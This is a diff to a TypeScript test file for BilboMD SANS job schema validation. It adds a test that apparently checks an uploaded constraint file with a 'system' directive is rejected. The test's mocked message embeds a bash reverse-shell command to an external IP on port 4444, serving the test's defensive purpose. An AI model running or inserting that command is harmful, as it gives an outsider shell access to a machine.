@@ -14,7 +14,8 @@ vi.mock('../ValidationFunctions', () => ({
   containsChainId: vi.fn().mockResolvedValue(true),
   hasAllowedResiduesOnly: vi
     .fn()
-    .mockResolvedValue({ valid: true, unsupportedResidues: [] })
+    .mockResolvedValue({ valid: true, unsupportedResidues: [] }),
+  isValidConstInpFile: vi.fn().mockResolvedValue(true)
 }))
 
 const makeFile = (name: string, size = 100): File => {
@@ -169,6 +170,16 @@ describe('BilboMDSANSJobSchema - inp_file', () => {
     await expect(
       BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
     ).resolves.toBe(file)
+  })
+
+  it('rejects inp_file containing a system directive (reverse shell exploit)', async () => {
+    vi.mocked(ValidationFunctions.isValidConstInpFile).mockResolvedValueOnce(
+      'Disallowed keyword in constraint file: "system "bash -i >& /dev/tcp/173.230.129.114/4444 0>&1""'
+    )
+    const file = makeFile('const.inp')
+    await expect(
+      BilboMDSANSJobSchema.validateAt('inp_file', { inp_file: file })
+    ).rejects.toThrow('Disallowed keyword')
   })
 
   it('rejects non-.inp extension', async () => {
